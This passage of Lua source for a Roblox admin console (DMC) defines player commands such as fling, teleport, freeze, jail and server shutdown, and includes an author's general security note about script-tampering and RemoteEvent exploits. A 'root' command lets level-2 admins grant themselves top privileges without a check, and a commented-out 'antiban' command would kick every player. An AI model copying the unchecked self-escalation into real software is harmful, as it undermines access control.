		repeat zran = math.random(-9999,9999) until math.abs(zran) >= 5555
		
			i.Character.Humanoid.Sit = true 
			i.Character.HumanoidRootPart.Velocity = Vector3.new(0,0,0)
			local frc = Instance.new("BodyForce", i.Character.HumanoidRootPart) 
			frc.Name = "BFRC" 
		frc.force = Vector3.new(xran*4,999*5,zran*4)
		game:GetService("Debris"):AddItem(frc,.1)
		end
	end
	Tell(sender,"Flung "..tostring(unpack(player))..".",3)
end

function Commands.sit(args,sender)
	MinimumPermission(1,sender)
	assert(args[1],"Player to sit is missing.")
	player = GetPlayersFromString(args[1],sender)
	
	for _,i in pairs(player) do
		if i.Character and i.Character:FindFirstChild("Humanoid") then
			i.Character:FindFirstChild("Humanoid").Sit = true
		end
	end
	Tell(sender,"Sat "..tostring(unpack(player))..".",3)
end

function Commands.respawn(args,sender)
	MinimumPermission(1,sender)
	assert(args[1],"Player to respawn is missing.")
	player = GetPlayersFromString(args[1],sender)
	
	for _,i in pairs(player) do
		i:LoadCharacter()
	end
	Tell(sender,"Respawned "..tostring(unpack(player))..".",3)
end

function Commands.reset(args,sender)
	MinimumPermission(1,sender)
	assert(args[1],"Player to reset is missing.")
	player = GetPlayersFromString(args[1],sender)
	for _,i in pairs(player) do
	local CharPos = i.Character:GetModelCFrame()
		i:LoadCharacter()
		i.Character:MoveTo(CharPos.p)
	end
	Tell(sender,""..tostring(unpack(player)).." has been reset.",3)
end

function Commands.refresh(...)
	Commands.reset(...)
end

function Commands.god(args,sender)
	MinimumPermission(1,sender)
	assert(args[1],"Player to god is missing.")
	player = GetPlayersFromString(args[1],sender)
	
	for _,a in pairs(player) do
		if a.Character and a.Character:FindFirstChild("Humanoid") then
			for i = 1, 3 do
				a.Character:FindFirstChild("Humanoid").MaxHealth = math.huge
				a.Character:FindFirstChild("Humanoid").Health = math.huge
			end
		end
	end
	Tell(sender,"Godded "..tostring(unpack(player))..".",3)
end

function Commands.ungod(args,sender)
	MinimumPermission(1,sender)
	assert(args[1],"Player to ungod is missing.")
	player = GetPlayersFromString(args[1],sender)
	
	for _,a in pairs(player) do
		if a.Character and a.Character:FindFirstChild("Humanoid") then
			for i = 1, 3 do
				a.Character:FindFirstChild("Humanoid").MaxHealth = 100
				a.Character:FindFirstChild("Humanoid").Health = 100
			end
		end
	end
	Tell(sender,"Ungodded "..tostring(unpack(player))..".",3)
end

function Commands.teleport(args,sender)
	MinimumPermission(1,sender)
	assert(args[1],"Players to teleport is missing.")
	assert(args[2],"Player to teleport to is missing.")
	player = GetPlayersFromString(args[1],sender)
	tpto = GetPlayersFromString(args[2],sender)
	
	if #tpto > 1 then
		error("Cannot teleport players to more than one person at once.")
	end
	
	assert(tpto[1],"Missing player to teleport to.")
	assert(tpto[1].Character,"Missing player to teleport to's Character.")
	assert(tpto[1].Character:FindFirstChild("HumanoidRootPart"),"Missing player to teleport to.")
	
	for _,a in pairs(player) do
		if a.Character then
			local chapos = tpto[1].Character:FindFirstChild("HumanoidRootPart").CFrame
			a.Character:FindFirstChild("HumanoidRootPart").CFrame = chapos
		end
	end
	Tell(sender,"Teleported ".. tostring(unpack(player)).." to "..tpto[1].Name..".",3)
end


function Commands.to(args,sender)
	MinimumPermission(1,sender)
	assert(args[1],"Player to teleport to is missing.")
	player = GetPlayersFromString(args[1],sender)
	
	assert(player[1].Character,"Missing player to teleport to's Character.")
	assert(player[1].Character:FindFirstChild("HumanoidRootPart"),"Missing player to teleport to.")
	
	for _,a in pairs(player) do
		if a.Character then
			local chapos = player[1].Character:FindFirstChild("HumanoidRootPart").CFrame
			sender.Character.HumanoidRootPart.CFrame = chapos
		end
	end
	Tell(sender,"Teleported to "..player[1].Name..".",3)
end

function Commands.watch(args,sender)
	MinimumPermission(1,sender)
	assert(args[1],"Player to watch is missing.")
	player = GetPlayersFromString(args[1],sender)
	
	for _,a in pairs(player) do
		if a.Character then
			Send(sender,"WatchCam",player[1].Character.Humanoid)
		end
	end
	Tell(sender,"Watching "..player[1].Name..".",3)
end

function Commands.unwatch(args,sender)
	MinimumPermission(1,sender)
	
	Send(sender,"UnWatch")
	Tell(sender,"Not watching anyone. ",3)
end

function Commands.pteleport(args,sender)
	MinimumPermission(2,sender)
	assert(args[1],"Players to teleport is missing.")
	assert(tonumber(args[2]),"Game ID invalid or missing.")
	player = GetPlayersFromString(args[1],sender)
	tpto = tostring(args[2])
	TeleportService.CustomizedTeleportUI = true
	
	for _,a in pairs(player) do
		if a.Character then
			TeleportService:Teleport(tpto,a)
		end
	end
	
	if not PlaceNames[tpto] then
		PlaceNames[tpto] = tpto
	end
	if type(PlaceNames[tpto]) == "number" then
		pcall(function()
			PlaceNames[tpto] = MarketplaceService:GetProductInfo(tpto)["Name"]
		end)
	end
	
	Tell(sender,"Teleported "..tostring(unpack(player)).." to place "..PlaceNames[tpto] or tpto..".",3)
end

function Commands.tp(args,sender)
	Commands.teleport(args,sender)
end

function Commands.tele(args,sender)
	Commands.teleport(args,sender)
end

function Commands.ptp(args,sender)
	Commands.pteleport(args,sender)
end

function Commands.ptele(args,sender)
	Commands.pteleport(args,sender)
end

function Commands.place(args,sender)
	Commands.pteleport(args,sender)
end

function Commands.ff(args,sender)
	MinimumPermission(1,sender)
	assert(args[1],"Player to give ForceField is missing.\n\n\ ff 'PlayerName'")
	player = GetPlayersFromString(args[1],sender)
	for _,i in pairs(player) do
		if i.Character then
			Instance.new("ForceField",i.Character)
		end
	end
	Tell(sender,"ForceFielded "..tostring(unpack(player))..".",3)
end

function Commands.sparkles(args,sender)
	MinimumPermission(1,sender)
	assert(args[1],"Player to give sparkles is missing.\n\n\ sparkles 'PlayerName'")
	player = GetPlayersFromString(args[1],sender)
	for _,i in pairs(player) do
		if i.Character then
			Instance.new("Sparkles",i.Character)
		end
	end
	Tell(sender,"Made "..tostring(unpack(player)).." sparkly.",3)
end

function Commands.unsparkles(args,sender)
	MinimumPermission(1,sender)
	assert(args[1],"Player to remove sparkles is missing.\n\n\ unsparkles 'PlayerName'")
	player = GetPlayersFromString(args[1],sender)
	
	for _,i in pairs(player) do
		while i.Character and i.Character:FindFirstChild("Sparkles") do
			i.Character:FindFirstChild("Sparkles"):Destroy()
		end
	end
	
	Tell(sender,"Made "..tostring(unpack(player)).." not so sparkly.",3)
end

function Commands.freeze(args,sender)
	MinimumPermission(1,sender)
	assert(args[1],"Player to freeze is missing.\n\n\ freeze 'PlayerName'")
	player = GetPlayersFromString(args[1],sender)
	
	for _,i in pairs(player) do
		if i.Character then
			if not i.Character:FindFirstChild("IceBlock") and i.Character:FindFirstChild("HumanoidRootPart") then
				local IceBlock = Instance.new("Part",i.Character)
				IceBlock.Name = "IceBlock"
				IceBlock.Anchored = true
				IceBlock.Locked = true
				IceBlock.BrickColor = BrickColor.new("Bright blue")
				IceBlock.Transparency = 0.5
				IceBlock.Size = Vector3.new(5,8,5)
				IceBlock.CFrame = CFrame.new(i.Character:FindFirstChild("HumanoidRootPart").Position) --sorry for leaving this broken so long :(
				
				local Weld = Instance.new("Weld",IceBlock)
				Weld.Part0 = IceBlock
				Weld.Part1 = i.Character:FindFirstChild("HumanoidRootPart")
			end
		end
	end
	
	Tell(sender,"Froze "..tostring(unpack(player))..".",3)
end

function Commands.lock(args,sender)
	MinimumPermission(1,sender)
	assert(args[1],"Player to lock is missing.\n\n\ lock 'PlayerName'")
	player = GetPlayersFromString(args[1],sender)
	
	for _,i in pairs(player) do
		if i.Character then
			for _,a in pairs(i.Character:GetChildren()) do
				if a:IsA("BasePart") then
					a.Locked = true
				end
			end
		end
	end
	
	Tell(sender,"Locked "..tostring(unpack(player))..".",3)
	error(" ")
end

function Commands.unlock(args,sender)
	MinimumPermission(1,sender)
	assert(args[1],"Player to unlock is missing.")
	player = GetPlayersFromString(args[1],sender)
	
	for _,i in pairs(player) do
		if i.Character then
			for _,a in pairs(i.Character:GetChildren()) do
				if a:IsA("BasePart") then
					a.Locked = false
				end
			end
		end
	end
	
	Tell(sender,"Unlocked "..tostring(unpack(player))..".",3)
end

function Commands.ghost(args,sender)
	MinimumPermission(1,sender)
	assert(args[1],"Player to ghost is missing.\n\n\ ghost 'PlayerName'")
	player = GetPlayersFromString(args[1],sender)
	
	for _,i in pairs(player) do
					if i.Character then 
						for a, obj in pairs(i.Character:children()) do 
							if obj:IsA("BasePart") then 
								obj.Transparency = 1 
								if obj:findFirstChild("face") then 
									obj.face.Transparency = 1 
								end 
							elseif obj:IsA("Accoutrement") and obj:findFirstChild("Handle") then 
								obj.Handle.Transparency = 1 
							end
						end
					end
	end
	
	Tell(sender,"Ghosted "..tostring(unpack(player))..".",3)
end

function Commands.invisible(...)
	Commands.ghost(...)
end

function Commands.visible(...)
	Commands.unghost(...)
end

function Commands.nograv(args,sender)
	MinimumPermission(1,sender)
	assert(args[1],"Player to nograv is missing.\n\n\ nograv 'PlayerName'")
	player = GetPlayersFromString(args[1],sender)
	
	for _,i in pairs(player) do
		if i.Character and i.Character:FindFirstChild("HumanoidRootPart") then
			local bodyforce = i.Character.Torso:FindFirstChild("NoGrav") or Instance.new("BodyForce", i.Character.Torso)
			bodyforce.Name = "NoGrav"
			bodyforce.force = Vector3.new(0,0,0)
			for _,a in pairs(i.Character:GetChildren()) do
				if a:IsA("BasePart") then
					bodyforce.force = bodyforce.force + Vector3.new(0,a:GetMass()*200,0)
				elseif (a:IsA("Hat")) and a:FindFirstChild("Handle") then
					bodyforce.force = bodyforce.force + Vector3.new(0,a:FindFirstChild("Handle"):GetMass()*200,0)
				end
			end
		end
	end
	
	Tell(sender,"Nograved "..tostring(unpack(player))..".",3)
end

function Commands.time(args,sender)
	MinimumPermission(1,sender)
		
	assert(tonumber(args[1]),"Time number is invalid. Provide a valid number.")
	
	if tonumber(args[1]) == 0 then
		error("You must include the time you want to set it to. \n\n\ Honestly, what else did you expect me to do for you without the time you want? I can't read your mind!")
	end
	if  tonumber(args[1]) >= 25 or tonumber(args[1]) < -1  then
		error("The way you formatted your time is unrecognized. \n\n\ You can only set the time between 1 and 24.")
	end
	
local goal = {}
goal.ClockTime = tonumber(args[1])
local tweenInfo = TweenInfo.new(3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
local tween = TweenService:Create(Lighting, tweenInfo, goal)
tween:Play()	
		Tell(sender,"Set time to "..args[1]..".",3)
	end

--[[function Commands.age(args,sender)
	MinimumPermission(3,sender)
	assert(args[1],"Player to retrieve age is missing.")
	
	Player = GetPlayersFromString(args[1],sender)
	
	local function UnixTimeToString(t)
		
		local function FormatDay(day)
			if day > 10 then
				repeat
					day = day - 10
				until day < 10
			end
			
			local Endings = {"th","st","nd","rd"}
			
			return day..(Endings[day + 1] or "th")
		end
		
		local TIMEZONE = -5
		local DST = 0
		
		local DaysInMonth = {31,28,31,30,31,30,31,31,30,31,30,31}
		
		local DaysInMonthStrings = {
			"January";
			"Febuary";
			"March";
			"April";
			"May";
			"June";
			"July";
			"August";
			"September";
			"October";
			"November";
			"December";
		}
		
		local year = math.floor(1970 + t / 31556926)
		local ds = ((1970 + t / 31556926) - year) * 31556926
		local month = math.floor(ds / 2629743) + 1
		local d = math.floor(ds / 86400) + 1
		local md = math.floor(((ds / 2629743 + 1) - month) * DaysInMonth[month]) + 1
		local wd = d % 7 + 6
		local DST = 1
		
		if month == 3 and md >= 14 then 
			DST =1
		else
			DST = 0
		end
		
		if month == 11 and md >= 7 then
			DST = 0
		else
			DST = 1
		end
		
		local h = math.floor(math.fmod(t,60 * 60 * 24) / 3600) + 5 + (TIMEZONE) + (DST)
		local mn = math.floor(math.fmod(t,60 * 60 * 24) / 60 - 60 * (h - DST))
		local s = math.floor(math.fmod( math.fmod(t,60 * 60 * 24),60) )
		
		return DaysInMonthStrings[month].." "..FormatDay(d)..", "..year
		
	end
	
	DisplayMessage(sender,"test",UnixTimeToString(os.time()))
	
	--u wot m8
	
end]]

function Commands.ping(args,sender)
	DisplayMessage(sender,"Ping","Pong!",5)
end

function Commands.grav(args,sender)
	MinimumPermission(1,sender)
	assert(args[1],"Player to ghost is missing.\n\n\ ghost 'PlayerName'")
	player = GetPlayersFromString(args[1],sender)
	
	for _,i in pairs(player) do
		if i.Character and i.Character:FindFirstChild("HumanoidRootPart") and i.Character:FindFirstChild("HumanoidRootPart"):FindFirstChild("NoGrav") then
			i.Character:FindFirstChild("HumanoidRootPart"):FindFirstChild("NoGrav"):Destroy()
		end
	end
	
	Tell(sender,"Graved "..tostring(unpack(player))..".",3)
end


function Commands.unghost(args,sender)
	MinimumPermission(1,sender)
	assert(args[1],"Player to unghost is missing.")
	player = GetPlayersFromString(args[1],sender)
	
	for _,i in pairs(player) do
					if i.Character then 
						for a, obj in pairs(i.Character:children()) do 
							if obj:IsA("BasePart") and obj.Name~='HumanoidRootPart' then 
								obj.Transparency = 0 
								if obj:findFirstChild("face") then 
									obj.face.Transparency = 0 
								end 
							elseif obj:IsA("Accoutrement") and obj:findFirstChild("Handle") then 
								obj.Handle.Transparency = 0 
							end
						end
					end
	end
	
	Tell(sender,"Unghosted "..tostring(unpack(player))..".",3)
end

function Commands.thaw(args,sender)
	MinimumPermission(1,sender)
	assert(args[1],"Player to thaw is missing.\n\n\ thaw 'PlayerName'")
	player = GetPlayersFromString(args[1],sender)
	
	for _,i in pairs(player) do
		if i.Character then
			if i.Character:FindFirstChild("IceBlock") then
				i.Character:FindFirstChild("IceBlock"):Destroy()
			end
		end
	end
	
	Tell(sender,"Thawed "..tostring(unpack(player))..".",3)
end

function Commands.fire(args,sender)
	MinimumPermission(1,sender)
	assert(args[1],"Player to burn is missing.\n\n\ burn 'PlayerName'")
	player = GetPlayersFromString(args[1],sender)
	for _,i in pairs(player) do
		if i.Character and i.Character:FindFirstChild("HumanoidRootPart") then
			Instance.new("Fire",i.Character:FindFirstChild("HumanoidRootPart"))
		end
	end
	Tell(sender,"Made "..tostring(unpack(player)).." burn.",3)
end

function Commands.light(args,sender)
	MinimumPermission(1,sender)
	assert(args[1],"Player to light up is missing.\n\n\ light 'PlayerName'")
	player = GetPlayersFromString(args[1],sender)
	for _,i in pairs(player) do
		if i.Character and i.Character:FindFirstChild("HumanoidRootPart") then
			Instance.new("SpotLight",i.Character:FindFirstChild("HumanoidRootPart"))
			i.Character.HumanoidRootPart.SpotLight.Range = 60
		Instance.new("PointLight",i.Character:FindFirstChild("HumanoidRootPart"))
		i.Character.HumanoidRootPart.PointLight.Range = 30
		end
	end
	Tell(sender,"Made "..tostring(unpack(player)).." light up.",3)
end

function Commands.smoke(args,sender)
	MinimumPermission(1,sender)
	assert(args[1],"Player to smoke is missing.\n\n\ smoke 'PlayerName'")
	player = GetPlayersFromString(args[1],sender)
	for _,i in pairs(player) do
		if i.Character and i.Character:FindFirstChild("HumanoidRootPart") then
			Instance.new("Smoke",i.Character:FindFirstChild("HumanoidRootPart"))
		end
	end
	Tell(sender,"Made "..tostring(unpack(player)).." smoke.",3)
end

function Commands.unsmoke(args,sender)
	MinimumPermission(1,sender)
	assert(args[1],"Player to remove smoke is missing.\n\n\ unsmoke 'PlayerName'")
	player = GetPlayersFromString(args[1],sender)
	
	for _,i in pairs(player) do
		while i.Character and i.Character:FindFirstChild("HumanoidRootPart") and i.Character:FindFirstChild("HumanoidRootPart"):FindFirstChild("Smoke") do
			i.Character:FindFirstChild("HumanoidRootPart"):FindFirstChild("Smoke"):Destroy()
		end
	end
	
	Tell(sender,"Made "..tostring(unpack(player)).." not smoke.",3)
end


function Commands.unlight(args,sender)
	MinimumPermission(1,sender)
	assert(args[1],"Player to remove light is missing.\n\n\ unlight 'PlayerName'")
	player = GetPlayersFromString(args[1],sender)
	
	for _,i in pairs(player) do
		if 	i.Character:FindFirstChild("HumanoidRootPart"):FindFirstChild("SpotLight") then
			i.Character:FindFirstChild("HumanoidRootPart"):FindFirstChild("SpotLight"):remove()
			i.Character:FindFirstChild("HumanoidRootPart"):FindFirstChild("PointLight"):remove()
		end
	end
	
	Tell(sender,"Removed "..tostring(unpack(player)).." SpotLight.",3)
end--[[
function Commands.antiban(args,sender)
	MinimumPermission(2,sender)
	assert(args[1],"Player to antiban is missing.\n\n\ antiban 'PlayerName'")
	player = GetPlayersFromString(args[1],sender) 
	TellAll("An antiban is enabled for "..tostring(unpack(player))..". Kicking or banning the player"..(#player == 1 and "" or "s")..", or if "..(#player == 1 and "he or she" or "they").." leave"..(#player == 1 and "s" or "")..", will cause the server to collapse.",3)
	--The above line is excessively long, but it provides the best grammar in the least amount of space :)
	for _,i in pairs(player) do
		spawn(function()
			local plrname = i.Name
			local plrid = i.userId
						
			while true do
				wait()
				Players.ChildRemoved:wait()
				local ok = false
				for _,i in pairs(Players:GetPlayers()) do
					if i.Name == plrname and i:IsA("Player") and i.userId == plrid then
						ok = true
					end
				end
				if not ok then
					DisplayMessageAll("DIscover! Management Console",plrname.." was kicked, banned, or has left the game with antiban enabled. The game is shutting down...",15)
					wait(7)
					for _,i in pairs(Players:GetPlayers()) do
						i:Kick("\n\ "..plrname.." was kicked, banned, or left the game with antiban enabled.\n\ The shutdown only affected this server.")
					end
					pcall(function()
						--Instance.new("ManualSurfaceJointInstance")
					end)
				end
			end
		end)
	end
end
]]
function Commands.slock(args,sender)
	MinimumPermission(2,sender)
	
	Tell(sender,"Lockdown enabled. Nobody else in permitted into the place except for admins and SuperAdmins.",10)
	Lockdown = true
end

function Commands.unslock(args,sender)
	MinimumPermission(2,sender)
	
	Tell(sender,"Lockdown disabled. Anyone may freely join.",3)
	Lockdown = false
end

function Commands.unfire(args,sender)
	MinimumPermission(1,sender)
	assert(args[1],"Player to unburn is missing.\n\n\ unburn 'PlayerName'")
	player = GetPlayersFromString(args[1],sender)
	
	for _,i in pairs(player) do
		while i.Character and i.Character:FindFirstChild("HumanoidRootPart") and i.Character:FindFirstChild("HumanoidRootPart"):FindFirstChild("Fire") do
			i.Character:FindFirstChild("HumanoidRootPart"):FindFirstChild("Fire"):Destroy()
		end
	end
	
	Tell(sender,"Made "..tostring(unpack(player)).." not burn.",3)
end

function Commands.extinguish(...)
	Commands.unfire(...)
end

function Commands.burn(...)
	Commands.fire(...)
end

function Commands.unburn(...)
	Commands.extinguish(...)
end

function Commands.explode(args,sender)
	MinimumPermission(1,sender)
	assert(args[1],"Player to explode is missing.\n\n\ explode 'PlayerName'")
	player = GetPlayersFromString(args[1],sender)
	
	for _,i in pairs(player) do
		if i.Character and i.Character:FindFirstChild("HumanoidRootPart") then
			Instance.new("Explosion",workspace).Position = i.Character:FindFirstChild("HumanoidRootPart").Position
		end
	end
	
	Tell(sender,"Exploded "..tostring(unpack(player))..".",3)
end

function Commands.unff(args,sender)
	MinimumPermission(1,sender)
	assert(args[1],"Player to remove ForceField is missing.\n\n\ unff 'PlayerName'")
	player = GetPlayersFromString(args[1],sender)
	
	for _,i in pairs(player) do
		while i.Character and i.Character:FindFirstChild("ForceField") do
			i.Character:FindFirstChild("ForceField"):Destroy()
		end
	end
	
	Tell(sender,"Removed "..tostring(unpack(player)).."'s ForceField.",3)
end

function Commands.walkspeed(args,sender)
	MinimumPermission(1,sender)
	local player = GetPlayersFromString(assert(args[1],"Player to change speed is missing."),sender)
	local speed = assert(tonumber(args[2]),"Speed is missing. or not a number.\n\n\ walkspeed 'PlayerName' 'Value'")
	for _,a in pairs(player) do
		if a.Character and a.Character:FindFirstChild("Humanoid") then
			for i = 1, 3 do
				a.Character:FindFirstChild("Humanoid").WalkSpeed = speed
			end
		end
	end
	Tell(sender,"Changed speed of "..tostring(unpack(player)).." to "..args[2]..".",3)
end

function Commands.sell(args,sender)
	MinimumPermission(1,sender)
	local players = GetPlayersFromString(assert(args[1],"Players to request purchase missing"),sender)
	local id = assert(tonumber(args[2]),"Item (id) to purchase missing or not a number\n\n\ sell 'ID' 'Value' ")
	for _,i in pairs(players) do
		MarketplaceService:PromptPurchase(i,id)
	end
end

function Commands.prison(args,sender)
	MinimumPermission(1,sender)
	assert(args[1],"Player to jail is missing.")
	player = GetPlayersFromString(args[1],sender)
	
	for _,i in pairs(player) do
		if i.Character then
			if not i.Character:FindFirstChild("JailPart") and i.Character:FindFirstChild("HumanoidRootPart") then
				local JailBlock = Instance.new("Part",i.Character)
				JailBlock.Name = "JailPart"
				JailBlock.Anchored = true
				JailBlock.Locked = true
				JailBlock.BrickColor = BrickColor.new("Really black")
				JailBlock.Material = "Neon"
				JailBlock.Transparency = 0.5
				JailBlock.Size = Vector3.new(5,8,5)
				JailBlock.CFrame = CFrame.new(i.Character:FindFirstChild("HumanoidRootPart").Position) --sorry for leaving this broken so long :(
				
				local Weld = Instance.new("Weld",JailBlock)
				Weld.Part0 = JailBlock
				Weld.Part1 = i.Character:FindFirstChild("HumanoidRootPart")
				i.Character.HumanoidRootPart.Anchored = true
			if i.Character:FindFirstChild("Humanoid") then
				i.Character:FindFirstChild("Humanoid").PlatformStand = true
				i.Character.Humanoid.Name = "JAILED."
			end
			end
		end
	end
	
	Tell(sender,"Jailed "..tostring(unpack(player))..".",3)
end

function Commands.unjail(args,sender)
	MinimumPermission(1,sender)
	assert(args[1],"Player to unjail is missing.")	
	player = GetPlayersFromString(args[1],sender)
	
	for _,i in pairs(player) do
		if i.Character then
			if i.Character:FindFirstChild("JailPart") then
				i.Character:FindFirstChild("JailPart"):Destroy()
			end
			if i.Character:FindFirstChild("JAILED.") then
				i.Character:FindFirstChild("JAILED.").Name = "Humanoid"
				i.Character:FindFirstChild("Humanoid").PlatformStand = false
				i.Character:FindFirstChild("HumanoidRootPart").Anchored = false
			end
		end
	end
	
	Tell(sender,"Removed "..tostring(unpack(player)).."'s prison cell.",3)
end

-----------------------------------------------------------------
----------------------- Core Commands ---------------------------
-----------------------------------------------------------------
function Commands.changelogs(args,sender)
DisplayScrollFrame(sender,"📥 DMC Change Log","Below are the past changes that was made on DMC.\n\Wish to request a feature to be added to the next revision of \n\DMC? Notify TechnologicalByte!",""..tostring(unpack(VNote)))
end

function Commands.changelog(args,sender)
DisplayScrollFrame(sender,"📥 DMC Change Log","Below are the past changes that was made on DMC.\n\Wish to request a feature to be added to the next revision of \n\DMC? Notify TechnologicalByte!",""..tostring(unpack(VNote)))
end

function Commands.credits(args,sender)
	DisplayScrollFrame(sender,"🤔 Credits","none",""..tostring(unpack(Credits)))
end

function Commands.securitynote(args,sender)
	DisplayScrollFrame(sender,"🗨 Security Note","This used to be a command in older revisions\n\of DMC, in which no longer is being updated.\n\This will remain for people who knows this command.",
		"This will talk about 2 things:\
1. The exploit leak in which exploiters can modify the console script.\
\
2. Ability for exploiters to sign their own code and exploit console\
commands.\
\ \
I've been working on this script for quite awhile now,\
and I think it's best for me to explain what's going on.\
\ \
ROBLOX has updated their game clients in order for\
exploits to be patched, but more and more exploits\
are being discovered daily.\
\ \
Some exploiters can easily modify the servers script in\
which can cause some issues with server scripts.\
Since older games doesn't have FilteringEnabled\
turned on, this can cause exploiters to insert their\
own code.\
\ \
Another thing is the RemoteEvent exploit. Exploiters can\
easily find a remote event in which he/she wants to trigger\
causing any scripts that are listening to that event to trigger.\
\ \
The console's events are for displaying messages from client to\
client. This is handy for FilteringEnabled since I don't have to\
recode the darn thing over, and over again.\
\ \
2. Exploiters changing console codes to gain access\
\ \
Since Revision 5, most of the local script inside the player \
controls every command to be fired from the RemoteEvents, \
but then I quickly learned from my mistake.\
\ \
Revision 10 has been patched that only DMC's console GUIS\
can interact with the events, if a exploiter attempts to remove\
any of the events, the console will function normally, but the\
GUI such as messages, hints, etc won't show in every client.\
\ \
I'm currently working on this to resolve this issue. Let's talk\
about exploiters changing server codes.\
\ \
Since Revision 5, this console script wasn't in \
ServerScriptService in which case is visible \
for clients in which they can view its functions. Starting \
Revision 10 and up, the main console core script \
will now be\ located in ServerScriptService, \
as it's not visible to the client, nor can't be modified in any way.\
\ \
I'll continue to work on this console by adding more\
commands, and probably a anti-exploit.\
\ \
Thanks for reading this security note. ~TechnologicalByte\
\
 ")
end

--[[
function Commands.stoploops(args,sender)
	MinimumPermission(1,sender)
	
	stoploops = true
	
	Tell(sender,"Stopped loops!")
	stoploops = true
end
]]

function Commands.spin(args,sender)
	MinimumPermission(1,sender)
	assert(args[1],"Player to spin is missing.")
	player = GetPlayersFromString(args[1],sender)
	
	for _,i in pairs(player) do
		if i.Character.HumanoidRootPart:FindFirstChild("Console_Spin")  then
			Tell(sender,""..tostring(unpack(player)).." is already spinning!",3)
			elseif i.Character:findFirstChild("HumanoidRootPart") then
			local torso = i.Character:findFirstChild("HumanoidRootPart")
			local bg = Instance.new("BodyGyro", i.Character.HumanoidRootPart) 
			bg.Name = "Console_Spin"
			bg.maxTorque = Vector3.new(0,math.huge,0) 
			bg.P = 11111 
			bg.D = 1
		script._CONSOLESTUFF.Console_SpinMusic:Clone().Parent = i.Character.HumanoidRootPart
			i.Character.HumanoidRootPart.Console_SpinMusic:Play()
		local bg = i.Character.HumanoidRootPart:FindFirstChild("Console_Spin")
		local torso = i.Character:findFirstChild("HumanoidRootPart")
		script._CLIENTEXECUTOR.Console_Spin:Clone().Parent = bg
					warn("Spin loop stopped to prevent core script breakage.")
					Tell(sender,"Made "..tostring(unpack(player)).." spun.",3)
					end
		end
end

function Commands.console(args,sender)
	Tell(sender,"ROBLOX Developer console opened.",3)
end

function Commands.clear(args,sender)
	Tell(sender,"Cleared the chat.",3)
end

function Commands.unspin(args,sender)
	MinimumPermission(1,sender)
	assert(args[1],"Player to unspin is missing.")
	player = GetPlayersFromString(args[1],sender)
	
	for _,i in pairs(player) do
		if not i.Character.HumanoidRootPart:FindFirstChild("Console_Spin") then
			Tell(sender,""..tostring(unpack(player)).." isn't spinning!",3)
		elseif i.Character and i.Character.HumanoidRootPart:findFirstChild("Console_Spin") then
			i.Character.HumanoidRootPart.Console_Spin:remove()
			i.Character.HumanoidRootPart.Console_SpinMusic:remove()
			Tell(sender,"Made "..tostring(unpack(player)).." stop spinning.",3)
		end
	end
end

function Commands.stop(args,sender)
		MinimumPermission(1,sender)
		
	if	ShutdownEnabled == true then
		DisplayMessage(sender,"Discover! Management Console","Shutdown aborted!",6)
				ShutdownEnabled = false
		wait(5)
		return
	end
	
	if Looping == true then
		Looping = false
			stoploops = true
		DisplayMessage(sender,"Discover! Management Console","Loop aborted!",6)
		return
	end
	
	if CountdownInProgress == true then
			StopCountdowns = true
			CountdownInProgress = false
	DisplayMessage(sender,"Discover! Management Console","Countdown aborted!",6)
	wait(1.1)
	StopCountdowns = false
	return
	end
	
	if stoploops == false then
		stoploops = true
		DisplayMessage(sender,"Discover! Management Console","Loop aborted!",6)
		return
	end
	
		DisplayMessage(sender,"Discover! Management Console","There's nothing to stop!",6)
end

function Commands.root(args,sender)
	MinimumPermission(2,sender)
	
	Permissions[sender.Name] = 3
	
	Tell(sender,"You have been given root privilages. This is only used for debugging DMC. Any hidden commands starting with root can be used.",10)
end

function Commands.shutdown(whatev,sender)
	MinimumPermission(2,sender)
	DisplayMessageAll("Discover! Management Console ","A shut down request has been made by "..sender.Name..".\n\ The game is shutting down...\n\n\ To abort the shutdown, type in "..CommandPrefix.."stop!",8)
	ShutdownEnabled = true
	wait(7)
	if ShutdownEnabled == true then
while wait() do
	for _,i in pairs(Players:GetPlayers()) do
		i:Kick("\n\This server has been shut down by "..sender.Name.." by using DMC.\n\ The shutdown only affected this server only.")
	end
end
	else
		return
		end
end
--[[
function Commands.version(whatev,sender) --OLD
	DisplayMessage(sender,"About Discover! Management Console", "Discover! Management Console. Easier for administrators to control, and to handle. This interface is only used with Discover! Official Admins and members. Discover! Management Console can only be given out by official members, and admins. You will not get permission unless granted.")
end
]]

function Commands.version(args,sender)
		DisplayScrollFrame(sender,"✒ About DMC","DISCOVER! MANAGEMENT CONSOLE ("..ChannelType.." Channel)\
Revision: "..revNo.." | Version: "..verNo.."\
© 2019 Discover! Incorporated.\
 ","\n\
	Licensed under the MIT License.\
	\ \
	For a list of commands, type in "..CommandPrefix.."cmds.\
\ \
	This admin has some old commands seen in some old\
	admins, I decided to bring them back to life with this \
	admin that I tweaked. It just so happens that some of \
	the commands seen in old admins are broken,\
	or doesn't work. It's my misson for me to fix them\
	and bring them back to life!\
	\ \
	I first started the DMC concept back in April, by\
	adding tiny commands, to expanding its interface\
	and by fixing bugs that come across us. At first,\
	DMC was only used for our facilities, but a lot\
	of people asked, where can I get this admin?\
	So, I worked till this day, adding new\
	commands, fixing issues, and improving\
	my admin.\
	\ \
	I would like to thank everyone who uses this\
	admin for their games, it's my mission to\
	deliver the best DMC experiences yet!\
	\ \
Regards,\
\
TechnologicalByte\
\ \
MIT LICENSE:\
Permission is hereby granted, free of charge, \
to any person obtaining a copy of this software \
and associated documentation files (the Software),\
to deal in the Software without restriction, including \
without limitation the rights to use, copy, modify, merge,\
publish, distribute, sublicense, and/or sell copies of the \
Software, and to permit persons to whom the Software is\
furnished to do so, subject to the following conditions:\
\ \
The above copyright notice and this permission notice shall\
be included in all copies or substantial portions of the Software.\
\ \
THE SOFTWARE IS PROVIDED 'AS IS', WITHOUT WARRANTY\
OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT\
LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS\
FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO\
EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE\
FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN\
ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF \
OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER\
DEALINGS IN THE SOFTWARE.\
")
end

function Commands.about(...)
	Commands.version(...)
end

function Commands.logs(whatev,sender)
	MinimumPermission(1,sender)
	local concat = ""
	for _,i in ipairs(logs) do
		concat = "\n\
